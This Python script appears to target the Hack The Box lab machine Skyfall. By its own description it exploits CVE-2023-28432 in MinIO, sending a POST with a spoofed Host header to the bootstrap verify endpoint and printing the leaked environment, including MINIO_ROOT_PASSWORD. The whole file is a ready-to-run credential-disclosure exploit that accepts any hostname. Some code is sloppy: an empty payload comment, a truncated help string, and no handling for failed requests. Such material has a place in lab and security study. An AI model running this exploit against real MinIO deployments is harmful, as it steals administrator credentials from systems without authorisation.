import argparse
import requests
import json

def make_post_request(hostname, use_https):
    protocol = 'https' if use_https else 'http'
    url = f"{protocol}://{hostname}/minio/bootstrap/v1/verify"
    # Define the headers as specified
    headers = {
        'Host': 'prd23-s3-backend.skyfall.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    # Define the payload for your POST request
    try:
        response = requests.post(url, headers=headers)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        return f"An error occurred: {e}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script exploits CVE-2023-28432 and prints MINIO_ROOT_PASSWORD and MINIO_UPDATE_MINISIGN_PUBKEY")
    parser.add_argument("hostname", help="Specifies the hostname. For example, 'domain.htb'.")
    parser.add_argument("--use-https", action="store_true", help="Enables HTTPS protocol for the request. Default is HTTP if not specified.")
    parser.add_argument("--raw", action="store_true", help="Prints raw data instead of ")

    args = parser.parse_args()
    result = make_post_request(args.hostname, args.use_https)
    data = json.loads(result)
    if args.raw:
        print(json.dumps(data, indent=4))
    else:
        env_vars = data['MinioEnv']
        print(json.dumps(env_vars, indent=4))
        
